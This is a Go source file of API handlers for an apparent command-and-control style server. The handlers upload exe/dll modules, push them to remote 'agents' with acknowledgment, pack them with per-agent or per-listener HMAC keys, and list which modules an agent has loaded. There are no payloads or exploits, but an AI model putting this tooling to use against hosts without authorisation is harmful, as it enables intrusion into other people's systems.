package controllers

import (
	"net/http"
	"path/filepath"
	"strings"
	"time"

	"cupcake-server/pkg/globals"
	"cupcake-server/services"
	"github.com/gin-gonic/gin"
)

// HandleListModules GET /api/modules?uuid= optional agent for loaded_on_agent flags
func HandleListModules(c *gin.Context) {
	ms := services.GetModuleService()
	agentUUID := strings.TrimSpace(c.Query("uuid"))
	catalog := ms.ListCatalog(agentUUID)
	c.JSON(http.StatusOK, gin.H{
		"modules": catalog,
		// backward-compatible id list
		"ids": ms.List(),
	})
}

// HandleUploadModule POST /api/modules/upload
// form: id=iso_host, file=<exe/dll>
func HandleUploadModule(c *gin.Context) {
	id := c.PostForm("id")
	if id == "" {
		id = c.Query("id")
	}
	if id == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "missing module id"})
		return
	}
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "missing file"})
		return
	}
	tmp := filepath.Join("storage", "modules", "_upload_"+filepath.Base(file.Filename))
	if err := c.SaveUploadedFile(file, tmp); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	ms := services.GetModuleService()
	if err := ms.LoadFromFile(id, tmp); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()})
		return
	}
	name, desc, kind := services.ModuleDescribe(id)
	c.JSON(http.StatusOK, gin.H{
		"msg":         "module registered",
		"id":          id,
		"name":        name,
		"description": desc,
		"kind":        kind,
	})
}

// HandlePushModule POST /api/modules/push
// json: {"uuid":"...","id":"iso_host","force":true}
// Waits for agent ack (up to 25s) so UI can show real success / loaded state.
func HandlePushModule(c *gin.Context) {
	var req struct {
		UUID  string `json:"uuid"`
		ID    string `json:"id"`
		Force bool   `json:"force"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.UUID == "" || req.ID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "uuid and id required"})
		return
	}
	ms := services.GetModuleService()
	if !req.Force && ms.AgentHasModule(req.UUID, req.ID) {
		name, _, _ := services.ModuleDescribe(req.ID)
		c.JSON(http.StatusOK, gin.H{
			"msg":    "module already staged/loaded on agent (pass force=true to re-push)",
			"id":     req.ID,
			"name":   name,
			"loaded": true,
			"alive":  true,
		})
		return
	}
	if req.Force {
		ms.ClearAgentModule(req.UUID, req.ID)
	}

	out, err := services.SendModuleStageWait(req.UUID, req.ID, 25*time.Second)
	name, desc, kind := services.ModuleDescribe(req.ID)
	if err != nil {
		// Timeout: do not claim loaded (SendModuleStageWait no longer marks optimistic)
		if strings.Contains(err.Error(), "timeout") {
			c.JSON(http.StatusGatewayTimeout, gin.H{
				"error":       err.Error(),
				"msg":         "模块已下发但确认超时，请稍后重试或 force 重推",
				"id":          req.ID,
				"name":        name,
				"description": desc,
				"kind":        kind,
				"loaded":      false,
				"alive":       false,
				"detail":      out,
			})
			return
		}
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error(), "id": req.ID, "name": name})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"msg":         "模块推送成功，已在目标主机就绪",
		"id":          req.ID,
		"name":        name,
		"description": desc,
		"kind":        kind,
		"loaded":      true,
		"alive":       true,
		"detail":      out,
	})
}

// HandlePackModule GET /api/modules/pack/:id?uuid=... or ?listener_id=...
// Without uuid/listener_id packs with default/dev key (debug only).
func HandlePackModule(c *gin.Context) {
	id := c.Param("id")
	ms := services.GetModuleService()
	name, desc, kind := services.ModuleDescribe(id)

	// Prefer agent/listener-aligned HMAC key when identity is provided
	var b64 string
	var err error
	if uuid := strings.TrimSpace(c.Query("uuid")); uuid != "" {
		if val, ok := globals.Clients.Load(uuid); ok {
			client := val.(*globals.Client)
			key := services.ModuleHMACKeyForAgent(client)
			b64, err = ms.PackBase64WithKey(id, key)
		} else {
			c.JSON(http.StatusNotFound, gin.H{"error": "agent offline; cannot pack with session key"})
			return
		}
	} else if lid := strings.TrimSpace(c.Query("listener_id")); lid != "" {
		if val, ok := globals.Listeners.Load(lid); ok {
			ln := val.(*globals.Listener)
			key := services.ModuleHMACKeyForListener(ln.EncryptKey, ln.EncryptionSalt)
			b64, err = ms.PackBase64WithKey(id, key)
		} else {
			c.JSON(http.StatusNotFound, gin.H{"error": "listener not found"})
			return
		}
	} else {
		b64, err = ms.PackBase64(id)
	}
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{"error": err.Error()})
		return
	}
	c.JSON(http.StatusOK, gin.H{
		"id":          id,
		"name":        name,
		"description": desc,
		"kind":        kind,
		"data":        b64,
	})
}

// HandleQueryAgentModules POST /api/modules/query
func HandleQueryAgentModules(c *gin.Context) {
	var req struct {
		UUID string `json:"uuid"`
	}
	if err := c.ShouldBindJSON(&req); err != nil || req.UUID == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "uuid required"})
		return
	}
	out, err := services.SendModuleList(req.UUID)
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
		return
	}
	ms := services.GetModuleService()
	c.JSON(http.StatusOK, gin.H{
		"result":  out,
		"modules": ms.ListCatalog(req.UUID),
	})
}
